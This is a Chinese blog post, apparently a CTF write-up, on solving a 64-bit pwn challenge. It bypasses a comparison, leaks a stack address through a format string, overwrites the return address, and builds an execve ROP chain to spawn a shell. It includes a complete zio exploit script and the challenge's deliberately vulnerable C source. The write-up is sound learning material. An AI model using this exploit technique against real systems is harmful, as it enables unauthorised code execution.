@@ -1,0 +1,360 @@
+<div class="blog-content-box">
+ <div class="article-title-box">
+  <span class="article-type type-1 float-left">
+   原
+  </span>
+  <h1 class="title-article">
+   CTF-浅尝64位栈溢出PWN
+  </h1>
+ </div>
+ <div class="article-info-box">
+  <div class="article-bar-top d-flex">
+   <span class="time">
+    2017年06月04日 14:51:06
+   </span>
+   <div class="float-right">
+    <span class="read-count">
+     阅读数：2152
+    </span>
+   </div>
+  </div>
+ </div>
+ <article>
+  <div class="article_content clearfix csdn-tracking-statistics" data-dsm="post" data-mod="popu_307" data-pid="blog" id="article_content">
+   <div class="markdown_views">
+    <p>
+     干了一早上终于把这道’难题’做出来了，实在是不容易。头一次完完全全的做出64位的pwn题，如果就栈溢出来说的话，其实感觉和32位的也差不多。至少这方面没有遇到太大的困难，做64位的题对汇编指令的要求就更高了。正好一边做题，一边多学点汇编。
+     <br/>
+     收获是很大的。
+    </p>
+    <hr/>
+    <h2 id="正文">
+     正文
+    </h2>
+    <p>
+     刚开始被一个逻辑漏洞cmp给卡着，一直没有跳到真正产生漏洞的地方，好不容易跳过去了，结果被我自己坑了(写脚本的时候，没有考虑缓冲区的影响，经常得不到自己想要的结果)。。几经周折终于调试正确。剩下的就是构造rop链，由于是静态编译，这一点也没什么难度，只要知道syscall对应的中断号和参数即可。
+     <br/>
+     最后跌跌撞撞总算是get shell了。
+     <br/>
+     在这里还是和大家分享一下，那些年我所犯下的错。
+     <br/>
+     习惯性的检查。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144117711?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     开了栈保护，那就很难去通过栈溢出覆盖返回值了。
+     <br/>
+     自己运行一下程序也没什么特别之处。
+     <br/>
+     IDA看看，是个静态编译的程序
+     <br/>
+     。。这里有小技巧，如果不说下可能还真不知道。有时候IDA没有把这段代码识别为一个函数，我们可以手动右键
+     <code>
+      create function
+     </code>
+     (忘记截图。尬)，之后再反汇编。(我自己都给忘了,直接看汇编给整出来的。汗！)
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144135992?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     反汇编之后这个逻辑就比较明显了，通过一个cmp我们进入到game这个函数
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144146175?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     再看看
+     <code>
+      format
+     </code>
+     和
+     <code>
+      format
+     </code>
+     都是什么
+     <br/>
+     这两个都在data段，并且可写。大概就是怎么写，写什么的问题了
+     <br/>
+     漏洞大概找到了。接下来就是调试阶段。比较痛苦~！
+     <br/>
+     先想办法把cmp给绕过。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144212758?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     我们先照着逻辑写一下。可以知道rdi是第一个参数，rsi是第二个参数。
+     <br/>
+     有关64位怎么传参可以参考这篇文章
+    </p>
+    <blockquote>
+     <p>
+      <a href="http://www.linuxidc.com/Linux/2013-09/90063.htm" rel="nofollow" target="_blank">
+       http://www.linuxidc.com/Linux/2013-09/90063.htm
+      </a>
+     </p>
+    </blockquote>
+    <p>
+     再看看此时寄存器的值。咦不对。进到cmp里面看看。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144223879?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     这个才是真正的cmp函数，此时寄存器的值才是真正的参数。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144245692?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     只需要使相应的值为
+     <code>
+      ’\x00’
+     </code>
+     即可。我建议是多看看汇编，这就不用猜了，直接算偏移量。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144313789?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     正确的结果是ZF为1。这是个零位标志寄存器。
+     <br/>
+     有关标志位寄存器，可以参考下这篇文章。
+    </p>
+    <blockquote>
+     <p>
+      <a href="http://blog.sina.com.cn/s/blog_87c063060101bcwt.html" rel="nofollow" target="_blank">
+       http://blog.sina.com.cn/s/blog_87c063060101bcwt.html
+      </a>
+     </p>
+    </blockquote>
+    <p>
+     第一步完成了！但还远没有结束！
+    </p>
+    <p>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144329834?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144343665?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     通过这个getstr可以写入0x28个字节，观察下发现，可以将s修改为format的地址。这就可以通过memcpy将数据copy到format中去了，别问我怎么知道的，实在是无法解释的太细，自己把这段代码都看看就知道了。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144442773?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     这是
+     <code>
+      getstr
+     </code>
+     函数，它会将字符串结尾的后一个字符置为
+     <code>
+      ’\x00’
+     </code>
+     <br/>
+     所以我们在输入的时候就会发现
+     <br/>
+     未输入：
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144419163?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     输入之后：
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144431306?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     发现不同了吗？？
+     <br/>
+     当时被这给坑的丫，不要不要的。这就会直接导致memcpy的位置不正确。
+     <br/>
+     Format之后的一个字节变成了
+     <code>
+      ’\x00’
+     </code>
+     ，这可不是我想要的，那怎么办？
+     <br/>
+     我是这么解决的。
+    </p>
+    <pre class="prettyprint"><code class=" hljs perl">payload=<span class="hljs-string">'1'</span><span class="hljs-variable">*0x20</span>+l64(<span class="hljs-number">0x6C1080</span>)
+payload=payload[<span class="hljs-number">0</span>:<span class="hljs-number">38</span>]           <span class="hljs-comment">#zhe shi yi ge ken dian</span>
+io.writeline(payload)</code></pre>
+    <p>
+     我就只输入38个字节，反正也没影响，这就刚好避免了。
+     <br/>
+     问题解决！
+     <br/>
+     通过第一个printf泄露stack地址
+     <br/>
+     通过第二个printf修改返回地址。接下来就是构造rop链。
+     <br/>
+     有关64位系统调用可以参考这篇文章。
+    </p>
+    <blockquote>
+     <p>
+      <a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" rel="nofollow" target="_blank">
+       http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
+      </a>
+     </p>
+    </blockquote>
+    <p>
+     简单说一下吧。
+     <br/>
+     由于两个format之间只差0x80个字节，因此我们也只有这么大的空间去构造rop链，所以有的没什么必要的参数可以不用构造。
+     <br/>
+     最后getshell。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170604144520103?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+    </p>
+    <p>
+     写在最后：咦~怎么有个栈保护呢，(这我好像还真没注意，不过对的栈溢出没有什么影响)
+     <br/>
+     哦！对了，这题应该不能算是个栈溢出，我们向其中写的数据是它所允许的长度，最后是通过格式化字符串来修改返回值的，因此可以绕过栈保护。一道题可以有多个漏洞，我们要尽量的将漏洞找齐了。
+     <br/>
+     心得体会：从早上8点一直到13:30，做了将近6个小时，第一次做64位的题确实有点不适应，每个地址都这么长，眼睛都看晕了，今天确实收获很多，也是头一次完全看汇编做的题，学到了很多。
+     <br/>
+     路还长~加油！
+    </p>
+    <pre class="prettyprint"><code class=" hljs perl">from zio import *
+import struct
+import <span class="hljs-keyword">time</span>
+target = (<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">10000</span>)
+<span class="hljs-comment">#target=('218.2.197.235', 20334)</span>
+io = zio(target, timeout=<span class="hljs-number">10000</span>, print_read=COLORED(RAW, <span class="hljs-string">'red'</span>), print_write=COLORED(RAW, <span class="hljs-string">'green'</span>))
+c2=raw_input(<span class="hljs-string">"go?"</span>)
+io.read_until(<span class="hljs-string">'play a game'</span>)
+format1=<span class="hljs-string">'%7$ld'</span>+<span class="hljs-string">'\x00'</span>+<span class="hljs-string">'1'</span><span class="hljs-variable">*2</span>                <span class="hljs-comment">#format</span>
+<span class="hljs-comment">#rop</span>
+<span class="hljs-comment">#format1+=l64(0x400867)  #pop rdi rbp</span>
+<span class="hljs-comment">#format1+=l64(0x1)</span>
+<span class="hljs-comment">#format1+=l64(0x0)</span>
+<span class="hljs-comment">#format1+=l64(0x47504A) #pop rax</span>
+<span class="hljs-comment">#format1+=l64(0x0)   </span>
+format1+=l64(<span class="hljs-number">0x437699</span>)    <span class="hljs-comment">#pop rdx rsi</span>
+format1+=l64(<span class="hljs-number">0x10</span>) 
+format1+=l64(<span class="hljs-number">0x6C2D40</span>)  <span class="hljs-comment">#bss</span>
+format1+=l64(<span class="hljs-number">0x437697</span>)  <span class="hljs-comment">#syscall pop rdx rsi</span>
+format1+=l64(<span class="hljs-number">0x0</span>)
+format1+=l64(<span class="hljs-number">0x0</span>)
+format1+=l64(<span class="hljs-number">0x47504A</span>)  <span class="hljs-comment">#pop rax</span>
+format1+=l64(<span class="hljs-number">0x3b</span>)
+format1+=l64(<span class="hljs-number">0x400867</span>) <span class="hljs-comment">#pop rdi rbp</span>
+format1+=l64(<span class="hljs-number">0x6C2D40</span>)
+format1+=l64(<span class="hljs-number">0x0</span>)
+format1+=l64(<span class="hljs-number">0x437697</span>)  <span class="hljs-comment">#syscall</span>
+format1+=l64(<span class="hljs-number">0x0</span>)
+format1+=l64(<span class="hljs-number">0x0</span>)
+format1+=l64(<span class="hljs-number">0x0</span>)
+format1+=<span class="hljs-string">'%'</span>+str(<span class="hljs-number">0x493</span>)+<span class="hljs-string">'d'</span>+<span class="hljs-string">'%8$hn'</span>+<span class="hljs-string">'a'</span><span class="hljs-variable">*25</span>+<span class="hljs-string">'\x00'</span> <span class="hljs-comment">#format1 pop r12 ret</span>
+<span class="hljs-keyword">index</span>=len(format1)
+payload=format1
+payload+=<span class="hljs-string">'1'</span><span class="hljs-variable">*(</span><span class="hljs-number">0x1f4</span>-<span class="hljs-keyword">index</span>)+<span class="hljs-string">'\x00'</span>       
+payload+=<span class="hljs-string">'1'</span><span class="hljs-variable">*(</span><span class="hljs-number">0x400</span>-<span class="hljs-number">0x1f4</span>)
+io.writeline(payload)
+c2=raw_input(<span class="hljs-string">'go?'</span>)
+io.read_until(<span class="hljs-string">'oh,where are you come from?'</span>)
+payload=<span class="hljs-string">'1'</span><span class="hljs-variable">*0x20</span>+l64(<span class="hljs-number">0x6C1080</span>)
+payload=payload[<span class="hljs-number">0</span>:<span class="hljs-number">38</span>]           <span class="hljs-comment">#zhe shi yi ge ken dian</span>
+io.writeline(payload)
+io.read_until(<span class="hljs-string">'I know!'</span>)
+test=io.<span class="hljs-keyword">read</span>(<span class="hljs-number">16</span>)
+stack=<span class="hljs-keyword">int</span>(test,<span class="hljs-number">10</span>)
+ret=stack-<span class="hljs-number">0x8</span>
+<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(ret)
+payload=l64(ret)+<span class="hljs-string">'a'</span><span class="hljs-variable">*0x8</span>
+io.writeline(payload)
+c2=raw_input(<span class="hljs-string">'go?'</span>)
+io.writeline(<span class="hljs-string">'/bin/sh\x00'</span>)
+io.interact()
+</code></pre>
+    <p>
+     一不小心找到了源码，大家可以看下。可能我之前有个地方解释错了额(getstr())
+    </p>
+    <pre class="prettyprint"><code class=" hljs axapta"><span class="hljs-preprocessor">#include&lt;stdio.h&gt;</span>
+<span class="hljs-preprocessor">#include&lt;string.h&gt;</span>
+<span class="hljs-keyword">char</span> formt[<span class="hljs-number">100</span>]=<span class="hljs-string">"hahaha,come to hurt by ourselves!!!"</span>;
+<span class="hljs-keyword">char</span> formt1[<span class="hljs-number">100</span>]=<span class="hljs-string">"bye bye!!"</span>;
+<span class="hljs-keyword">char</span> s[<span class="hljs-number">2000</span>]={<span class="hljs-number">0</span>};
+<span class="hljs-keyword">void</span> getstr(<span class="hljs-keyword">char</span> *s,<span class="hljs-keyword">int</span> <span class="hljs-keyword">index</span>);
+<span class="hljs-keyword">void</span> game(<span class="hljs-keyword">char</span> *name);
+<span class="hljs-keyword">int</span> cmp(<span class="hljs-keyword">char</span> *a,<span class="hljs-keyword">char</span> *b);
+<span class="hljs-keyword">int</span> main()
+{<span class="hljs-keyword">char</span> name[<span class="hljs-number">1032</span>];
+name[<span class="hljs-number">1024</span>]=<span class="hljs-string">'\x0a'</span>;
+name[<span class="hljs-number">1025</span>]=<span class="hljs-string">'\x0a'</span>;
+name[<span class="hljs-number">1026</span>]=<span class="hljs-string">'\x0a'</span>;
+name[<span class="hljs-number">1027</span>]=<span class="hljs-string">'\x0a'</span>;
+name[<span class="hljs-number">1028</span>]=<span class="hljs-string">'\x0a'</span>;
+name[<span class="hljs-number">1029</span>]=<span class="hljs-string">'\x0a'</span>;
+name[<span class="hljs-number">1030</span>]=<span class="hljs-string">'\x0a'</span>;
+name[<span class="hljs-number">1031</span>]=<span class="hljs-string">'\0'</span>;
+setvbuf(stdin, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);
+setvbuf(stdout, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);
+printf(<span class="hljs-string">"hey,xman!\n"</span>);
+printf(<span class="hljs-string">"let's play a game\n"</span>);
+getstr(name,<span class="hljs-number">1026</span>);
+<span class="hljs-keyword">if</span>(cmp(&amp;name[<span class="hljs-number">1025</span>],name)==<span class="hljs-number">0</span>)
+{printf(<span class="hljs-string">"you made it!!!\n"</span>); 
+ printf(<span class="hljs-string">"now!,let's begin\n"</span>);
+ game(name);}
+<span class="hljs-keyword">else</span> {printf(<span class="hljs-string">"0h,you lose it!\n"</span>);exit(<span class="hljs-number">0</span>);}
+exit(<span class="hljs-number">0</span>);}
+
+
+
+<span class="hljs-keyword">void</span> game(<span class="hljs-keyword">char</span> *name)
+{<span class="hljs-keyword">char</span> test[<span class="hljs-number">40</span>];
+<span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> buf[<span class="hljs-number">6</span>];
+buf[<span class="hljs-number">4</span>]=(<span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span>)s;
+buf[<span class="hljs-number">5</span>]=(<span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span>)name;
+
+printf(<span class="hljs-string">"oh,where are you come from?\n"</span>);
+getstr((<span class="hljs-keyword">char</span> *)buf,<span class="hljs-number">40</span>);
+memcpy((<span class="hljs-keyword">char</span> *)buf[<span class="hljs-number">4</span>],(<span class="hljs-keyword">char</span> *)buf[<span class="hljs-number">5</span>],<span class="hljs-number">256</span>);
+printf(<span class="hljs-string">"I know!\n"</span>);
+printf(formt);
+getstr((<span class="hljs-keyword">char</span> *)buf,<span class="hljs-number">32</span>);
+printf(formt1);
+}
+
+
+<span class="hljs-keyword">void</span> getstr(<span class="hljs-keyword">char</span> *s,<span class="hljs-keyword">int</span> <span class="hljs-keyword">index</span>)
+{<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;
+<span class="hljs-keyword">for</span>(;i&lt;<span class="hljs-keyword">index</span>;i++)
+{scanf(<span class="hljs-string">"%c"</span>,&amp;s[i]);
+ <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">'\n'</span>||(s[i]==<span class="hljs-string">'h'</span>&amp;&amp;s[i-<span class="hljs-number">1</span>]==<span class="hljs-string">'s'</span>))
+     <span class="hljs-keyword">break</span>;}
+s[i]=<span class="hljs-string">'\0'</span>;
+ }
+
+<span class="hljs-keyword">int</span> cmp(<span class="hljs-keyword">char</span> *a,<span class="hljs-keyword">char</span> *b)
+{<span class="hljs-keyword">return</span> strcmp(a,&amp;b[<span class="hljs-number">500</span>]);}
+</code></pre>
+   </div>
+   <link href="https://csdnimg.cn/release/phoenix/template/css/markdown_views-ea0013b516.css" rel="stylesheet"/>
+  </div>
+  <div class="hide-article-box text-center csdn-tracking-statistics tracking-click" data-mod="popu_376">
+   <a class="btn btn-red-hollow" id="btn-readmore">
+    阅读更多
+   </a>
+  </div>
+ </article>
+ <div class="article-bar-bottom">
+  <div class="article-copyright">
+   版权声明：本文为博主原创文章，未经博主允许不得转载。			https://blog.csdn.net/qq_33438733/article/details/72858980
+  </div>
+  <div class="tags-box artic-tag-box">
+   <span class="label">
+    文章标签：
+   </span>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=CTF&amp;t=blog" target="_blank">
+    CTF
+   </a>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=PWN&amp;t=blog" target="_blank">
+    PWN
+   </a>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=64位&amp;t=blog" target="_blank">
+    64位
+   </a>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=栈溢出&amp;t=blog" target="_blank">
+    栈溢出
+   </a>
+  </div>
+  <div class="tags-box">
+   <span class="label">
+    个人分类：
+   </span>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6925810" target="_blank">
+    PWN
+   </a>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6945018" target="_blank">
+    CTF
+   </a>
+  </div>
+ </div>
+ <!-- !empty($pre_next_article[0]) -->
+</div>
